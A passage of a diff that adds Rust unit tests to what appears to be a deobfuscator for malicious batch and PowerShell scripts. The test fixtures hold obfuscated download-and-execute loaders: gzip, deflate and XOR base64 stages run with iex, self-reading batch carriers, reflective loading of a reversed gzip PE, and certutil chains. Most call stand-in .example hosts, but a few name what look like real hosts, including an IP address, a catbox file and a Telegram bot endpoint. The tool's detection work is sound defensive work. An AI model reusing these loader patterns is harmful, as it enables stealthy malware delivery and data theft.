+        let mut encoder = flate2::write::GzEncoder::new(Vec::new(), flate2::Compression::default());
+        encoder.write_all(decoded.as_bytes()).unwrap();
+        let gz = encoder.finish().unwrap();
+        let b64 = base64::engine::general_purpose::STANDARD.encode(gz);
+        let ps = format!(
+            r#"
+$blob = "{b64}"
+function InflateBytes ([byte[]]$bytes) {{
+    $inputStream = [IO.MemoryStream]::new($bytes)
+    $gzipStream = [IO.Compression.GZipStream]::new($inputStream, [IO.Compression.CompressionMode]::Decompress)
+    $outputStream = [IO.MemoryStream]::new()
+    $gzipStream.CopyTo($outputStream)
+    $outputStream.ToArray()
+}}
+$stage = [Text.Encoding]::UTF8.GetString((InflateBytes([Convert]::FromBase64String($blob)))).TrimEnd("`0")
+iex $stage
+"#
+        );
+        let normalized = crate::ps1_scan::normalize_ps1_text(&ps);
+        assert!(
+            normalized.contains("https://gzip-func.example/stage.ps1"),
+            "variable gzip function payload not decoded:\n{}",
+            normalized
+        );
+        assert!(
+            !normalized.contains("FromBase64String($blob)"),
+            "gzip function base64 call should be replaced by decoded script:\n{}",
+            normalized
+        );
+    }
+
+    #[test]
+    fn ps1_normalization_decodes_variable_deflate_function_base64() {
+        use base64::Engine;
+        use std::io::Write;
+
+        let filler: String = (0..1024).map(|n| format!("{n:04x}")).collect();
+        let decoded =
+            format!("Invoke-WebRequest -Uri https://deflate-func.example/stage.ps1\r\n# {filler}");
+        let mut encoder =
+            flate2::write::DeflateEncoder::new(Vec::new(), flate2::Compression::default());
+        encoder.write_all(decoded.as_bytes()).unwrap();
+        let deflated = encoder.finish().unwrap();
+        let b64 = base64::engine::general_purpose::STANDARD.encode(deflated);
+        let ps = format!(
+            r#"
+$blob = "{b64}"
+function InflateBytes ([byte[]]$bytes) {{
+    $inputStream = [IO.MemoryStream]::new($bytes)
+    $deflateStream = [IO.Compression.DeflateStream]::new($inputStream, [IO.Compression.CompressionMode]::Decompress)
+    $outputStream = [IO.MemoryStream]::new()
+    $deflateStream.CopyTo($outputStream)
+    $outputStream.ToArray()
+}}
+$stage = [Text.Encoding]::UTF8.GetString((InflateBytes([Convert]::FromBase64String($blob)))).TrimEnd("`0")
+iex $stage
+"#
+        );
+        let normalized = crate::ps1_scan::normalize_ps1_text(&ps);
+        assert!(
+            normalized.contains("https://deflate-func.example/stage.ps1"),
+            "variable deflate function payload not decoded:\n{}",
+            normalized
+        );
+        assert!(
+            !normalized.contains("FromBase64String($blob)"),
+            "deflate function base64 call should be replaced by decoded script:\n{}",
+            normalized
+        );
+    }
+
+    #[test]
     fn ps1_normalization_escapes_binary_controls() {
         let normalized = crate::ps1_scan::normalize_ps1_text("Invoke-Expression 'A\0B\x01C'\r\n");
         assert!(
@@ -7902,6 +18315,30 @@ mod ps1_obfuscation_tests {
     }
 
     #[test]
+    fn ps1_normalization_decodes_constant_sum_stride_calls_before_definition() {
+        let ps = concat!(
+            "$preeditorially=4;$tungetalerens=55;",
+            "function serviettens ($x) {",
+            "$haandhvende=helligaanden('Phlogisma Firsaarsfdselsdages Diastrophe Ungkokkens Gar????[IIIIi== =n,tttt: ::]y yy$ &&&t%%%rGGG,owwwwsddddrFFFFe<<<<tWWW nmmmmizzzznMMMMgVVVVeUU UrQQ.Q1ooo 4;;;;5 jjj MMMM-!!!!b tt.x')",
+            "};",
+            "function helligaanden ($pauver) {",
+            "$legman8=$preeditorially+$tungetalerens;",
+            "do {$mitraille+=$pauver[$legman8];$legman8+=5} while ($pauver[$legman8])",
+            "$mitraille",
+            "};",
+            "serviettens 'x'"
+        );
+
+        let normalized = crate::ps1_scan::normalize_ps1_text(ps);
+
+        assert!(
+            normalized.contains("[int]$tGwdF<WmzMVUQo; M! "),
+            "constant-sum stride call before decoder definition was not decoded:\n{}",
+            normalized
+        );
+    }
+
+    #[test]
     fn ps1_normalization_decodes_smart_quote_url_concat() {
         let ps = concat!(
             "Invoke-WebRequest -Uri (",
@@ -7936,6 +18373,42 @@ mod ps1_obfuscation_tests {
         assert!(
             normalized.contains("'http://x.com'"),
             "multi-chunk char-array concat not decoded:\n{}",
+            normalized
+        );
+    }
+
+    #[test]
+    fn ps1_normalization_decodes_string_join_char_array() {
+        let chars = "https://string-join-char-array.example/stage.ps1"
+            .chars()
+            .map(|ch| u32::from(ch).to_string())
+            .collect::<Vec<_>>()
+            .join(",");
+        let ps = format!("iex ([string]::Join('', [char[]]({chars})))");
+
+        let normalized = crate::ps1_scan::normalize_ps1_text(&ps);
+
+        assert!(
+            normalized.contains("https://string-join-char-array.example/stage.ps1"),
+            "string Join char-array call was not decoded:\n{}",
+            normalized
+        );
+    }
+
+    #[test]
+    fn ps1_normalization_decodes_unary_join_char_array() {
+        let chars = "https://unary-join-char-array.example/stage.ps1"
+            .chars()
+            .map(|ch| u32::from(ch).to_string())
+            .collect::<Vec<_>>()
+            .join(",");
+        let ps = format!("iex (-join [char[]]({chars}))");
+
+        let normalized = crate::ps1_scan::normalize_ps1_text(&ps);
+
+        assert!(
+            normalized.contains("https://unary-join-char-array.example/stage.ps1"),
+            "unary join char-array call was not decoded:\n{}",
             normalized
         );
     }
@@ -8075,6 +18548,18 @@ mod ps1_obfuscation_tests {
     }
 
     #[test]
+    fn ps1_normalization_collapses_double_quoted_single_literal_join() {
+        let ps = r#"$method=("DownloadString" -join ""); $url=("https://readable-dq.example/a" -join "")"#;
+        let normalized = crate::ps1_scan::normalize_ps1_text(ps);
+        assert!(
+            normalized.contains("$method='DownloadString'")
+                && normalized.contains("$url='https://readable-dq.example/a'"),
+            "double-quoted single-literal join was not collapsed:\n{}",
+            normalized
+        );
+    }
+
+    #[test]
     fn ps1_normalization_preserves_variable_name_on_append_assignment_lhs() {
         let ps = r#"$client='Net.w';$client+='EBClIeNT';$url='https://readable.example/a';Invoke-WebRequest -Uri $url"#;
         let normalized = crate::ps1_scan::normalize_ps1_text(ps);
@@ -8099,6 +18584,18 @@ mod ps1_obfuscation_tests {
     }
 
     #[test]
+    fn ps1_normalization_decodes_double_quoted_reversed_string_slice_join() {
+        let ps = r#"[Convert]::("gnirtS46esaBmorF"[-1..-16] -join "")('AAAA');[Reflection.Assembly]::("daoL"[-1..-4] -join "")($b)"#;
+        let normalized = crate::ps1_scan::normalize_ps1_text(ps);
+        assert!(
+            normalized.contains("[Convert]::'FromBase64String'('AAAA')")
+                && normalized.contains("[Reflection.Assembly]::'Load'($b)"),
+            "double-quoted reversed string slice join not decoded:\n{}",
+            normalized
+        );
+    }
+
+    #[test]
     fn ps1_normalization_decodes_tochararray_reverse_join() {
         let ps = r#"$p='exe.loPsaC\91303.0.4v\krowemarF\TEN.tfosorciM\swodniW\:C';$chars=$p.ToCharArray();[array]::Reverse($chars);$path=-join($chars);Start-Process $path"#;
         let normalized = crate::ps1_scan::normalize_ps1_text(ps);
@@ -8109,6 +18606,21 @@ mod ps1_obfuscation_tests {
                     "Start-Process 'C:\\Windows\\Microsoft.NET\\Framework\\v4.0.30319\\CasPol.exe'"
                 ),
             "ToCharArray reverse join not decoded:\n{}",
+            normalized
+        );
+    }
+
+    #[test]
+    fn ps1_normalization_decodes_double_quoted_tochararray_reverse_join() {
+        let ps = r#"$p="exe.loPsaC\91303.0.4v\krowemarF\TEN.tfosorciM\swodniW\:C";$chars=$p.ToCharArray();[array]::Reverse($chars);$path=-join($chars);Start-Process $path"#;
+        let normalized = crate::ps1_scan::normalize_ps1_text(ps);
+        assert!(
+            normalized
+                .contains("$path='C:\\Windows\\Microsoft.NET\\Framework\\v4.0.30319\\CasPol.exe'")
+                && normalized.contains(
+                    "Start-Process 'C:\\Windows\\Microsoft.NET\\Framework\\v4.0.30319\\CasPol.exe'"
+                ),
+            "double-quoted ToCharArray reverse join not decoded:\n{}",
             normalized
         );
     }
@@ -8158,6 +18670,52 @@ powershell -NoP -C "try {{ $Natural = (Get-Content '%~f0') -join [Environment]::
     }
 
     #[test]
+    fn ps1_self_read_marker_base64_carrier_line_is_summarized_without_losing_payload() {
+        use base64::Engine;
+        let marker = "remoK3Z8Q5FIG2qXL6SsHa7";
+        let payload = format!(
+            "$u='https://selfread-marker-long.example/FLEE.ps1'; Invoke-WebRequest -Uri $u;#{}",
+            "A".repeat(8_192)
+        );
+        let b64 = base64::engine::general_purpose::STANDARD.encode(payload.as_bytes());
+        let script = format!(
+            r#"@echo off
+powershell -NoP -C "try {{ $sweep = Get-Content '%~f0' -Raw; if ($sweep -match '{marker}([A-Za-z0-9+/=]+)') {{ [Text.Encoding]::UTF8.GetString([Convert]::FromBase64String($matches[1])) | iex }} }} catch {{}}"
+exit /b
+{marker}{b64}
+"#
+        );
+        let report = analyze(script.as_bytes(), &Config::default());
+        assert!(
+            report
+                .extracted_ps1_normalized
+                .iter()
+                .any(|ps| ps.contains("https://selfread-marker-long.example/FLEE.ps1")),
+            "marker self-read payload was not normalized:\n{:?}",
+            report.extracted_ps1_normalized
+        );
+        assert!(
+            report.traits.iter().any(|t| {
+                matches!(t, Trait::Download { src, .. }
+                    if src.contains("selfread-marker-long.example/FLEE.ps1"))
+            }),
+            "marker self-read payload URL was not extracted: {:?}",
+            report.traits
+        );
+        assert!(
+            report
+                .deobfuscated
+                .contains("harrington: omitted self-read base64 marker payload"),
+            "marker carrier line was not summarized:\n{}",
+            report.deobfuscated
+        );
+        assert!(
+            !report.deobfuscated.contains(&b64),
+            "marker carrier base64 remained in deobfuscated output"
+        );
+    }
+
+    #[test]
     fn ps1_self_read_tail_base64_payload_is_extracted() {
         use base64::Engine;
         let payload = "$u='https://selftail.example/FLEE.ps1'; Invoke-WebRequest -Uri $u";
@@ -8196,6 +18754,88 @@ exit
         assert!(
             !report.deobfuscated.contains(&b64),
             "duplicate tail payload was left in deobfuscated output"
+        );
+    }
+
+    #[test]
+    fn ps1_self_read_tail_reversed_gzip_pe_is_recovered() {
+        use base64::Engine;
+        use std::io::Write as _;
+
+        let url = "https://selftail-pe.example/payload";
+        let mut pe = vec![0u8; 0x200];
+        pe[0..2].copy_from_slice(b"MZ");
+        pe[0x3c..0x40].copy_from_slice(&0x80u32.to_le_bytes());
+        pe[0x80..0x84].copy_from_slice(b"PE\0\0");
+        pe.extend_from_slice(url.as_bytes());
+        let mut reversed = pe.clone();
+        reversed.reverse();
+        let mut gz = flate2::write::GzEncoder::new(Vec::new(), flate2::Compression::default());
+        gz.write_all(&reversed).unwrap();
+        let b64 = base64::engine::general_purpose::STANDARD.encode(gz.finish().unwrap());
+        let ps = r#"$x=[IO.File]::ReadLines(([System.Diagnostics.Process]::GetCurrentProcess().MainModule.FileName.ToString()+".bat"),[text.encoding]::UTF8) | Select-Object -last 1;$b=[Convert]::FromBase64String($x);$m=New-Object System.IO.MemoryStream(,$b);$o=New-Object System.IO.MemoryStream;$g=New-Object System.IO.Compression.GzipStream $m,([IO.Compression.CompressionMode]::Decompress);$g.CopyTo($o);[byte[]]$p=$o.ToArray();[Array]::Reverse($p);[System.Reflection.Assembly]::Load($p)"#;
+        let utf16: Vec<u8> = ps.encode_utf16().flat_map(|u| u.to_le_bytes()).collect();
+        let encoded_ps = base64::engine::general_purpose::STANDARD.encode(utf16);
+        let script = format!("powershell -enc {encoded_ps}\r\nexit\r\n{b64}\r\n");
+
+        let report = analyze(script.as_bytes(), &Config::default());
+
+        assert!(
+            report.recovered_pe.iter().any(|(label, bytes)| label
+                .starts_with("ps1-self-tail-reversed-gzip-pe")
+                && bytes.starts_with(b"MZ")),
+            "reversed gzip PE was not recovered: {:?}",
+            report.recovered_pe
+        );
+        assert!(
+            report
+                .traits
+                .iter()
+                .any(|t| matches!(t, Trait::DownloadInDeobText { src, .. } if src == url)),
+            "recovered PE URL was not extracted: {:?}",
+            report.traits
+        );
+    }
+
+    #[test]
+    fn ps1_self_read_marker_chunks_reversed_gzip_pe_is_recovered() {
+        use base64::Engine;
+        use std::io::Write as _;
+
+        let url = "https://selfmarker-pe.example/payload";
+        let mut pe = vec![0u8; 0x200];
+        pe[0..2].copy_from_slice(b"MZ");
+        pe[0x3c..0x40].copy_from_slice(&0x80u32.to_le_bytes());
+        pe[0x80..0x84].copy_from_slice(b"PE\0\0");
+        pe.extend_from_slice(url.as_bytes());
+        let mut reversed = pe.clone();
+        reversed.reverse();
+        let mut gz = flate2::write::GzEncoder::new(Vec::new(), flate2::Compression::default());
+        gz.write_all(&reversed).unwrap();
+        let b64 = base64::engine::general_purpose::STANDARD.encode(gz.finish().unwrap());
+        let (left, right) = b64.split_at(b64.len() / 2);
+        let ps = r#"$exe=[System.Diagnostics.Process]::GetCurrentProcess().MainModule.FileName;$sb=New-Object -TypeName System.Text.StringBuilder;foreach($line in [System.IO.File]::ReadLines($exe.Remove($exe.Length-4))){if($line -like '* Ǵ*'){$sb.Append($line.Split('Ǵ')[1])|Out-Null}};$bytes=[Convert]::FromBase64String($sb.ToString());$input=New-Object System.IO.MemoryStream(,$bytes);$output=New-Object System.IO.MemoryStream;$gzipStream=New-Object System.IO.Compression.GzipStream $input,([IO.Compression.CompressionMode]::Decompress);$gzipStream.CopyTo($output);[byte[]]$bytes=$output.ToArray();[Array]::Reverse($bytes);[System.Reflection.Assembly]::Load($bytes)"#;
+        let utf16: Vec<u8> = ps.encode_utf16().flat_map(|u| u.to_le_bytes()).collect();
+        let encoded_ps = base64::engine::general_purpose::STANDARD.encode(utf16);
+        let script =
+            format!("powershell -enc {encoded_ps}\r\nset a= Ǵ{left}\r\nset b= Ǵ{right}\r\n");
+
+        let report = analyze(script.as_bytes(), &Config::default());
+
+        assert!(
+            report.recovered_pe.iter().any(|(label, bytes)| label
+                .starts_with("ps1-self-marker-reversed-gzip-pe")
+                && bytes.starts_with(b"MZ")),
+            "marker reversed gzip PE was not recovered: {:?}",
+            report.recovered_pe
+        );
+        assert!(
+            report
+                .traits
+                .iter()
+                .any(|t| matches!(t, Trait::DownloadInDeobText { src, .. } if src == url)),
+            "recovered marker PE URL was not extracted: {:?}",
+            report.traits
         );
     }
 
@@ -8268,6 +18908,254 @@ exit
     }
 
     #[test]
+    fn ps1_file_backed_base64_xor_loader_resolves_basename_content() {
+        use base64::Engine;
+        let payload = "Invoke-WebRequest -Uri https://xorloader-basename.example/stage.ps1";
+        let encrypted: Vec<u8> = payload
+            .encode_utf16()
+            .flat_map(|u| u.to_le_bytes())
+            .map(|b| b ^ 253)
+            .collect();
+        let b64 = base64::engine::general_purpose::STANDARD.encode(encrypted);
+        let script = format!(
+            "@echo off\r\necho {b64} > \"%TEMP%\\\\stage.dat\"\r\npowershell -NoP -C \"$k=253;$d=(gc 'STAGE.DAT') -join '';$b=[Convert]::FromBase64String($d);$x=0..($b.Length-1)|%{{$b[$_]-bxor$k}};$s=[Text.Encoding]::Unicode.GetString($x);iex $s\"\r\n"
+        );
+        let report = analyze(script.as_bytes(), &Config::default());
+        assert!(
+            report
+                .extracted_ps1_normalized
+                .iter()
+                .any(|ps| ps.contains("https://xorloader-basename.example/stage.ps1")),
+            "basename file-backed xor stage was not normalized:\n{:?}",
+            report.extracted_ps1_normalized
+        );
+        assert!(
+            report.traits.iter().any(|t| {
+                matches!(t, Trait::Download { src, .. } if src.contains("xorloader-basename.example/stage.ps1"))
+            }),
+            "basename file-backed xor stage URL was not extracted: {:?}",
+            report.traits
+        );
+    }
+
+    #[test]
+    fn ps1_file_backed_base64_xor_loader_accepts_get_content_raw() {
+        use base64::Engine;
+        let payload = "Invoke-WebRequest -Uri https://xorloader-raw.example/stage.ps1";
+        let encrypted: Vec<u8> = payload
+            .encode_utf16()
+            .flat_map(|u| u.to_le_bytes())
+            .map(|b| b ^ 253)
+            .collect();
+        let b64 = base64::engine::general_purpose::STANDARD.encode(encrypted);
+        let script = format!(
+            "@echo off\r\necho {b64} > \"%TEMP%\\\\stage.dat\"\r\npowershell -NoP -C \"$k=253;$d=Get-Content -Raw 'STAGE.DAT';$b=[Convert]::FromBase64String($d);$x=0..($b.Length-1)|%{{$b[$_]-bxor$k}};$s=[Text.Encoding]::Unicode.GetString($x);iex $s\"\r\n"
+        );
+        let report = analyze(script.as_bytes(), &Config::default());
+        assert!(
+            report
+                .extracted_ps1_normalized
+                .iter()
+                .any(|ps| ps.contains("https://xorloader-raw.example/stage.ps1")),
+            "Get-Content -Raw file-backed xor stage was not normalized:\n{:?}",
+            report.extracted_ps1_normalized
+        );
+        assert!(
+            report.traits.iter().any(|t| {
+                matches!(t, Trait::Download { src, .. } if src.contains("xorloader-raw.example/stage.ps1"))
+            }),
+            "Get-Content -Raw file-backed xor stage URL was not extracted: {:?}",
+            report.traits
+        );
+    }
+
+    #[test]
+    fn ps1_file_backed_base64_xor_loader_accepts_get_content_path_raw() {
+        use base64::Engine;
+        let payload = "Invoke-WebRequest -Uri https://xorloader-path-raw.example/stage.ps1";
+        let encrypted: Vec<u8> = payload
+            .encode_utf16()
+            .flat_map(|u| u.to_le_bytes())
+            .map(|b| b ^ 253)
+            .collect();
+        let b64 = base64::engine::general_purpose::STANDARD.encode(encrypted);
+        let script = format!(
+            "@echo off\r\necho {b64} > \"%TEMP%\\\\stage.dat\"\r\npowershell -NoP -C \"$k=253;$d=Get-Content 'STAGE.DAT' -Raw;$b=[Convert]::FromBase64String($d);$x=0..($b.Length-1)|%{{$b[$_]-bxor$k}};$s=[Text.Encoding]::Unicode.GetString($x);iex $s\"\r\n"
+        );
+        let report = analyze(script.as_bytes(), &Config::default());
+        assert!(
+            report
+                .extracted_ps1_normalized
+                .iter()
+                .any(|ps| ps.contains("https://xorloader-path-raw.example/stage.ps1")),
+            "Get-Content path -Raw file-backed xor stage was not normalized:\n{:?}",
+            report.extracted_ps1_normalized
+        );
+        assert!(
+            report.traits.iter().any(|t| {
+                matches!(t, Trait::Download { src, .. } if src.contains("xorloader-path-raw.example/stage.ps1"))
+            }),
+            "Get-Content path -Raw file-backed xor stage URL was not extracted: {:?}",
+            report.traits
+        );
+    }
+
+    #[test]
+    fn ps1_file_backed_base64_xor_loader_accepts_system_convert() {
+        use base64::Engine;
+        let payload = "Invoke-WebRequest -Uri https://xorloader-system-convert.example/stage.ps1";
+        let encrypted: Vec<u8> = payload
+            .encode_utf16()
+            .flat_map(|u| u.to_le_bytes())
+            .map(|b| b ^ 253)
+            .collect();
+        let b64 = base64::engine::general_purpose::STANDARD.encode(encrypted);
+        let script = format!(
+            "@echo off\r\necho {b64} > \"%TEMP%\\\\stage.dat\"\r\npowershell -NoP -C \"$k=253;$d=Get-Content -Raw 'STAGE.DAT';$b=[System.Convert]::FromBase64String($d);$x=0..($b.Length-1)|%{{$b[$_]-bxor$k}};$s=[Text.Encoding]::Unicode.GetString($x);iex $s\"\r\n"
+        );
+        let report = analyze(script.as_bytes(), &Config::default());
+        assert!(
+            report
+                .extracted_ps1_normalized
+                .iter()
+                .any(|ps| ps.contains("https://xorloader-system-convert.example/stage.ps1")),
+            "System.Convert file-backed xor stage was not normalized:\n{:?}",
+            report.extracted_ps1_normalized
+        );
+        assert!(
+            report.traits.iter().any(|t| {
+                matches!(t, Trait::Download { src, .. } if src.contains("xorloader-system-convert.example/stage.ps1"))
+            }),
+            "System.Convert file-backed xor stage URL was not extracted: {:?}",
+            report.traits
+        );
+    }
+
+    #[test]
+    fn ps1_file_backed_base64_xor_loader_accepts_cat_alias() {
+        use base64::Engine;
+        let payload = "Invoke-WebRequest -Uri https://xorloader-cat-alias.example/stage.ps1";
+        let encrypted: Vec<u8> = payload
+            .encode_utf16()
+            .flat_map(|u| u.to_le_bytes())
+            .map(|b| b ^ 253)
+            .collect();
+        let b64 = base64::engine::general_purpose::STANDARD.encode(encrypted);
+        let script = format!(
+            "@echo off\r\necho {b64} > \"%TEMP%\\\\stage.dat\"\r\npowershell -NoP -C \"$k=253;$d=cat 'STAGE.DAT' -Raw;$b=[Convert]::FromBase64String($d);$x=0..($b.Length-1)|%{{$b[$_]-bxor$k}};$s=[Text.Encoding]::Unicode.GetString($x);iex $s\"\r\n"
+        );
+        let report = analyze(script.as_bytes(), &Config::default());
+        assert!(
+            report
+                .extracted_ps1_normalized
+                .iter()
+                .any(|ps| ps.contains("https://xorloader-cat-alias.example/stage.ps1")),
+            "cat alias file-backed xor stage was not normalized:\n{:?}",
+            report.extracted_ps1_normalized
+        );
+        assert!(
+            report.traits.iter().any(|t| {
+                matches!(t, Trait::Download { src, .. } if src.contains("xorloader-cat-alias.example/stage.ps1"))
+            }),
+            "cat alias file-backed xor stage URL was not extracted: {:?}",
+            report.traits
+        );
+    }
+
+    #[test]
+    fn ps1_file_backed_base64_xor_loader_accepts_get_content_path_parameter() {
+        use base64::Engine;
+        let payload = "Invoke-WebRequest -Uri https://xorloader-path-parameter.example/stage.ps1";
+        let encrypted: Vec<u8> = payload
+            .encode_utf16()
+            .flat_map(|u| u.to_le_bytes())
+            .map(|b| b ^ 253)
+            .collect();
+        let b64 = base64::engine::general_purpose::STANDARD.encode(encrypted);
+        let script = format!(
+            "@echo off\r\necho {b64} > \"%TEMP%\\\\stage.dat\"\r\npowershell -NoP -C \"$k=253;$d=Get-Content -Path 'STAGE.DAT' -Raw;$b=[Convert]::FromBase64String($d);$x=0..($b.Length-1)|%{{$b[$_]-bxor$k}};$s=[Text.Encoding]::Unicode.GetString($x);iex $s\"\r\n"
+        );
+        let report = analyze(script.as_bytes(), &Config::default());
+        assert!(
+            report
+                .extracted_ps1_normalized
+                .iter()
+                .any(|ps| ps.contains("https://xorloader-path-parameter.example/stage.ps1")),
+            "Get-Content -Path file-backed xor stage was not normalized:\n{:?}",
+            report.extracted_ps1_normalized
+        );
+        assert!(
+            report.traits.iter().any(|t| {
+                matches!(t, Trait::Download { src, .. } if src.contains("xorloader-path-parameter.example/stage.ps1"))
+            }),
+            "Get-Content -Path file-backed xor stage URL was not extracted: {:?}",
+            report.traits
+        );
+    }
+
+    #[test]
+    fn ps1_file_backed_base64_xor_loader_accepts_get_content_literal_path_parameter() {
+        use base64::Engine;
+        let payload = "Invoke-WebRequest -Uri https://xorloader-literal-path.example/stage.ps1";
+        let encrypted: Vec<u8> = payload
+            .encode_utf16()
+            .flat_map(|u| u.to_le_bytes())
+            .map(|b| b ^ 253)
+            .collect();
+        let b64 = base64::engine::general_purpose::STANDARD.encode(encrypted);
+        let script = format!(
+            "@echo off\r\necho {b64} > \"%TEMP%\\\\stage.dat\"\r\npowershell -NoP -C \"$k=253;$d=Get-Content -LiteralPath 'STAGE.DAT' -Raw;$b=[Convert]::FromBase64String($d);$x=0..($b.Length-1)|%{{$b[$_]-bxor$k}};$s=[Text.Encoding]::Unicode.GetString($x);iex $s\"\r\n"
+        );
+        let report = analyze(script.as_bytes(), &Config::default());
+        assert!(
+            report
+                .extracted_ps1_normalized
+                .iter()
+                .any(|ps| ps.contains("https://xorloader-literal-path.example/stage.ps1")),
+            "Get-Content -LiteralPath file-backed xor stage was not normalized:\n{:?}",
+            report.extracted_ps1_normalized
+        );
+        assert!(
+            report.traits.iter().any(|t| {
+                matches!(t, Trait::Download { src, .. } if src.contains("xorloader-literal-path.example/stage.ps1"))
+            }),
+            "Get-Content -LiteralPath file-backed xor stage URL was not extracted: {:?}",
+            report.traits
+        );
+    }
+
+    #[test]
+    fn ps1_file_backed_base64_xor_loader_resolves_variable_path() {
+        use base64::Engine;
+        let payload = "Invoke-WebRequest -Uri https://xorloader-variable-path.example/stage.ps1";
+        let encrypted: Vec<u8> = payload
+            .encode_utf16()
+            .flat_map(|u| u.to_le_bytes())
+            .map(|b| b ^ 253)
+            .collect();
+        let b64 = base64::engine::general_purpose::STANDARD.encode(encrypted);
+        let script = format!(
+            "@echo off\r\necho {b64} > \"%TEMP%\\\\stage.dat\"\r\npowershell -NoP -C \"$k=253;$p='STAGE.DAT';$d=Get-Content -Raw $p;$b=[Convert]::FromBase64String($d);$x=0..($b.Length-1)|%{{$b[$_]-bxor$k}};$s=[Text.Encoding]::Unicode.GetString($x);iex $s\"\r\n"
+        );
+        let report = analyze(script.as_bytes(), &Config::default());
+        assert!(
+            report
+                .extracted_ps1_normalized
+                .iter()
+                .any(|ps| ps.contains("https://xorloader-variable-path.example/stage.ps1")),
+            "variable path file-backed xor stage was not normalized:\n{:?}",
+            report.extracted_ps1_normalized
+        );
+        assert!(
+            report.traits.iter().any(|t| {
+                matches!(t, Trait::Download { src, .. } if src.contains("xorloader-variable-path.example/stage.ps1"))
+            }),
+            "variable path file-backed xor stage URL was not extracted: {:?}",
+            report.traits
+        );
+    }
+
+    #[test]
     fn ps1_sorted_comment_chunks_are_extracted() {
         let script = concat!(
             ":: 030000000002eadable.example/a.ps1\r\n",
@@ -8324,6 +19212,29 @@ exit
             report.traits
         );
     }
+
+    #[test]
+    fn char_concat_arithmetic_resolves_url() {
+        use base64::Engine;
+        let ps = r#"Invoke-WebRequest -Uri ([char](100+4)+[char](120-4)+[char](0x70+4)+[char](0x70)+[char](110+5)+[char](60-2)+[char](40+7)+[char](40+7)+[char](120)+[char](50-4)+[char](90+9)+[char](100+11)+[char](100+9))"#;
+        let b64 = base64::engine::general_purpose::STANDARD.encode(
+            ps.encode_utf16()
+                .flat_map(|c| c.to_le_bytes())
+                .collect::<Vec<_>>(),
+        );
+        let script = format!("powershell -EncodedCommand {}\r\n", b64);
+        let report = analyze(script.as_bytes(), &Config::default());
+        let has = report.traits.iter().any(|t| {
+            matches!(t,
+                Trait::Download { src, .. } if src.contains("https://x.com")
+            )
+        });
+        assert!(
+            has,
+            "arithmetic char-cast-concat not deobfuscated: {:?}",
+            report.traits
+        );
+    }
 }
 
 #[cfg(test)]
@@ -8369,6 +19280,50 @@ mod recursive_payload_tests {
         assert!(
             has,
             "inline echo certutil chain missed: {:?}",
+            report.traits
+        );
+    }
+
+    #[test]
+    fn decoded_child_scripts_are_reported_in_stable_path_order() {
+        let a_bat = "curl -o a.exe http://a.example/p\r\n";
+        let b_bat = "curl -o z.exe http://z.example/p\r\n";
+        let a_b64 = base64::engine::general_purpose::STANDARD.encode(a_bat.as_bytes());
+        let b_b64 = base64::engine::general_purpose::STANDARD.encode(b_bat.as_bytes());
+        let script = format!(
+            "echo {b_b64}>b.src\r\n\
+             certutil -decode b.src z-child.bat\r\n\
+             echo {a_b64}>a.src\r\n\
+             certutil -decode a.src a-child.bat\r\n"
+        );
+
+        let report = analyze(script.as_bytes(), &Config::default());
+        let a_banner = report
+            .deobfuscated
+            .find("decoded child script (a-child.bat)")
+            .expect("missing a-child decoded banner");
+        let z_banner = report
+            .deobfuscated
+            .find("decoded child script (z-child.bat)")
+            .expect("missing z-child decoded banner");
+        assert!(
+            a_banner < z_banner,
+            "decoded child banners should be stable path order:\n{}",
+            report.deobfuscated
+        );
+
+        let recursive_dsts: Vec<_> = report
+            .traits
+            .iter()
+            .filter_map(|t| match t {
+                Trait::RecursiveAnalysis { dst, depth: 1 } => Some(dst.as_str()),
+                _ => None,
+            })
+            .collect();
+        assert_eq!(
+            recursive_dsts,
+            vec!["a-child.bat", "z-child.bat"],
+            "recursive traits should be stable path order: {:?}",
             report.traits
         );
     }
@@ -8442,6 +19397,48 @@ mod ps1_var_substitution_tests {
     }
 
     #[test]
+    fn ps_braced_variable_interpolation_in_url_resolves() {
+        let inner = r#"$TOKEN = '123:abc'; $TG = "https://api.telegram.org/bot${TOKEN}"; Invoke-RestMethod -Uri "$TG/sendMessage" -Method Post"#;
+        let script = format!("powershell -Command \"{}\"\r\n", inner);
+        let report = analyze(script.as_bytes(), &Config::default());
+        let has = report.traits.iter().any(|t| {
+            matches!(t,
+                Trait::Download { src, .. } if src.contains("api.telegram.org/bot123:abc/sendMessage")
+            )
+        });
+        assert!(
+            has,
+            "no Download from braced variable URL interpolation: {:?}",
+            report.traits
+        );
+    }
+
+    #[test]
+    fn ps_outer_command_quotes_do_not_expand_assignment_lhs() {
+        let script = r#"powershell -w h "$u='https://files.catbox.moe/5rvuod.txt';iex(irm $u)""#;
+        let report = analyze(script.as_bytes(), &Config::default());
+        assert!(
+            report.traits.iter().any(|t| {
+                matches!(t,
+                    Trait::Download { src, .. } if src == "https://files.catbox.moe/5rvuod.txt"
+                )
+            }),
+            "expected clean Download trait: {:?}",
+            report.traits
+        );
+        assert!(
+            !report.traits.iter().any(|t| {
+                matches!(t,
+                    Trait::Download { src, .. } | Trait::DownloadInDeobText { src, .. }
+                        if src.contains("5rvuod.txt=")
+                )
+            }),
+            "assignment LHS was expanded into a bogus URL: {:?}",
+            report.traits
+        );
+    }
+
+    #[test]
     fn ps_command_concat_from_bound_variables_resolves_downloadstring() {
         let inner = r#"$var1='(New-Ob';$var2='ject Net.Web';$var3='Client)';$var4='.DownloadString(';$var5='''http://92.255.85.2/a.mp4''';$var6=')';$command=$var1+$var2+$var3+$var4+$var5+$var6;IEX $command|IEX"#;
         let script = format!("powershell -Command \"{}\"\r\n", inner);
@@ -8505,6 +19502,40 @@ mod ps_replace_join_tests {
     }
 
     #[test]
+    fn ps_unary_join_array_resolves() {
+        let inner = r#"Invoke-WebRequest (-join @('h','t','t','p','s',':','/','/','ps-unary-join.example','/stage'))"#;
+        let script = format!("powershell -Command \"{}\"\r\n", inner);
+        let report = analyze(script.as_bytes(), &Config::default());
+        let has = report.traits.iter().any(|t| {
+            matches!(t,
+                Trait::Download { src, .. } if src == "https://ps-unary-join.example/stage"
+            )
+        });
+        assert!(
+            has,
+            "no Download after unary -join array: {:?}\n{}",
+            report.traits, report.deobfuscated
+        );
+    }
+
+    #[test]
+    fn ps_join_double_quoted_array_resolves() {
+        let inner = r#"Invoke-WebRequest ("h","t","t","p","s",":","/","/","ps-join-dq.example","/stage" -join "")"#;
+        let script = format!("powershell -Command \"{}\"\r\n", inner);
+        let report = analyze(script.as_bytes(), &Config::default());
+        let has = report.traits.iter().any(|t| {
+            matches!(t,
+                Trait::Download { src, .. } if src == "https://ps-join-dq.example/stage"
